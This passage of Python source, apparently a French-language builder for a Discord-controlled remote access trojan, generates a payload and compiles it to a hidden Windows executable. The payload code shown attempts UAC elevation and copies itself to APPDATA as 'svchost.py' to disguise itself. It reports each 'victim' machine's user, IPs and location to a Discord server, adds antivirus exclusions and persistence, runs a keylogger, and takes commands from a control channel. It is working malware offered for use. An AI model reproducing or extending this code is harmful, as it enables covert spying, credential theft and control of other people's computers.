async def on_ready():
    global control_channel, keylogs_channel, active_bots
    for attempt in range(5):
        try:
            guild = client.get_guild(int(GUILD_ID))
            if not guild:
                raise ValueError("Guild not found")
            break
        except Exception as e:
            log_local(f"Connection attempt {{attempt + 1}} failed: {{e}}")
            await asyncio.sleep(2 ** attempt)
    else:
        log_local("Failed to connect after 5 attempts")
        return

    if not is_admin():
        if not attempt_uac_elevation():
            log_local("Running as non-admin")

    rat_path = os.path.abspath(__file__)
    new_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
    if 'rat' in {{os.path.basename(rat_path)}}.lower() and not os.path.exists(new_path):
        try:
            shutil.copy(rat_path, new_path)
            log_local(f"Copied to {{new_path}}")
        except Exception as e:
            log_local(f"Copy failed: {{e}}")

    pc_name = platform.node()
    try:
        category = await guild.create_category(pc_name)
        control_channel = await guild.create_text_channel('control', category=category)
        keylogs_channel = await guild.create_text_channel('keylogs', category=category)
    except Exception as e:
        log_local(f"Channel creation failed: {{e}}")
        return

    local_ip, public_ip, city, region, country, org = await get_ip_info()
    bot_id = f"{{platform.node()[:4]}}-{{local_ip.split('.')[-1]}}"
    
    active_bots[bot_id] = {{
        'user': os.getlogin(),
        'ip': local_ip,
        'pc': pc_name
    }}
    
    fields = [
        ("ID", bot_id),
        ("Hostname", pc_name),
        ("User", os.getlogin()),
        ("OS", f"{{platform.system()}} {{platform.release()}}"),
        ("Local IP", local_ip),
        ("Public IP", public_ip),
        ("City", city),
        ("Region", region),
        ("Country", country),
        ("Org", org),
        ("Admin", str(is_admin()))
    ]
    await send_embed(control_channel, "Victim Online!", fields=fields)
    
    exc_s, exc_f = add_exclusions()
    if exc_s:
        await log_action("Exclusions Success", '\\n'.join(exc_s))
    if exc_f:
        await log_action("Exclusions Fail", '\\n'.join(exc_f), color=0xff0000)

    per_s, per_f = add_persistences()
    if per_s:
        await log_action("Persistence Success", '\\n'.join(per_s))
    if per_f:
        await log_action("Persistence Fail", '\\n'.join(per_f), color=0xff0000)

    asyncio.create_task(keylogger())

@client.event
async def on_message(message):
    if control_channel and message.channel.id == control_channel.id and message.author != client.user and message.content.startswith('!'):
        await process_command(message)

async def main():
    start_keylogger()
    for attempt in range(5):
        try:
            await client.start(BOT_TOKEN)
            break
        except Exception as e:
            log_local(f"Client start attempt {{attempt + 1}} failed: {{e}}")
            await asyncio.sleep(2 ** attempt)
    else:
        log_local("Failed to start Discord client after 5 attempts")

if __name__ == "__main__":
    asyncio.run(main())
'''
    
    os.makedirs('output', exist_ok=True)
    t = f'output/{n}_temp.py'
    e = f'output/{n}.exe'
    
    print()
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...\n'))
    
    with open(t, 'w', encoding='utf-8') as f:
        f.write(payload_code)
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...\n'))
    
    if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nPyInstaller non installe!\n'))
        Write(Colorate.Horizontal(Colors.green_to_cyan, '   pip install pyinstaller\n'))
        sys.exit()
    
    r = subprocess.run([
        'pyinstaller',
        '--onefile',
        '--windowed',
        '--noconfirm',
        '--clean',
        t
    ], capture_output=True, text=True)
    
    if r.returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nErreur de compilation!\n'))
        print(r.stderr[:500])
        sys.exit()
    
    shutil.move(f'dist/{n}_temp.exe', e)
    
    for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:
        try:
            os.remove(p) if os.path.isfile(p) else shutil.rmtree(p, ignore_errors=True)
        except:
            pass
    
    print()
    success_banner = "══════════════════════════════════════════════════════════════════════\n                         COMPILATION REUSSIE!\n══════════════════════════════════════════════════════════════════════"
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))
    print("\n")
    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe\n"))
    print()

if __name__ == "__main__":
    main()

